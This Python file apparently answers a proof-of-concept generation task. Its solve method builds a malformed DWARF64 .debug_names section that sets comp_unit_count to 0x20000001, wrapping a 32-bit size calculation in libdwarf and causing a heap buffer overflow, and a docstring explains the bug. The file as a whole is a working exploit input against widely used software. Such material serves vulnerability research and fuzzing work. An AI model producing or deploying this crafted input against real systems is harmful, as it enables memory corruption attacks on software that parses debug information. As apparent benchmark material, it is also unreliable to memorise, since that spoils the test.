import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept input for a heap buffer overflow in libdwarf.

        The vulnerability exists in the `_dwarf_load_debug_names` function when
        calculating the total size of the .debug_names section. Several multiplications
        involving counts read from the file (as uint32_t) and fixed sizes can
        overflow if performed with 32-bit arithmetic. This leads to a small
        calculated buffer size and a subsequent small allocation. The code then
        proceeds to read data using the original large count, causing a heap
        buffer overflow.

        This PoC targets the calculation for the compilation unit offsets table size:
        `comp_unit_count * sizeof(Dwarf_Offset)`. On a 64-bit system, `sizeof(Dwarf_Offset)`
        is 8. To overflow a 32-bit multiplication, `comp_unit_count` must be at least
        2^32 / 8 = 2^29 (0x20000000). We set it to 0x20000001. The result of
        `0x20000001 * 8` in 32-bit arithmetic wraps around to 8.

        This leads to a small calculated total size. We set the DWARF section length
        to this minimal calculated size to create a compact PoC. The resulting PoC is
        a malformed DWARF64 .debug_names section that triggers the vulnerability.
        """
        # The minimal calculated size that passes the validation check, due to
        # the integer overflow.
        # header_part_size = 24 bytes (version, padding, 5 counts)
        # cu_offsets_size = 8 bytes (wrapped from 0x20000001 * 8)
        # bucket_table_size = 4 bytes (1 bucket * 4)
        # name_offsets/entry_offsets size = 16 bytes (1 name * 2 * 8)
        # augmentation_size = 1 byte (1 name * 1)
        # Total = 24 + 8 + 4 + 16 + 1 = 53
        actual_length = 53

        poc = bytearray()
        
        # DWARF64 uses a 4-byte sentinel for unit_length, followed by an 8-byte actual length.
        poc += b'\xff\xff\xff\xff'
        poc += struct.pack('<Q', actual_length)

        # .debug_names header content
        version = 5
        padding = 0
        comp_unit_count = 0x20000001  # Value to trigger 32-bit integer overflow
        local_type_unit_count = 0
        foreign_type_unit_count = 0
        bucket_count = 1
        name_count = 1

        poc += struct.pack('<H', version)
        poc += struct.pack('<H', padding)
        poc += struct.pack('<I', comp_unit_count)
        poc += struct.pack('<I', local_type_unit_count)
        poc += struct.pack('<I', foreign_type_unit_count)
        poc += struct.pack('<I', bucket_count)
        poc += struct.pack('<I', name_count)
        
        # The vulnerable code allocates a small buffer but then attempts to read
        # comp_unit_count * 8 bytes of data. We just need to provide enough
        # data to match the declared `actual_length`.
        header_fields_len = 2 + 2 + (5 * 4)
        data_len = actual_length - header_fields_len
        poc += b'\x00' * data_len

        return bytes(poc)
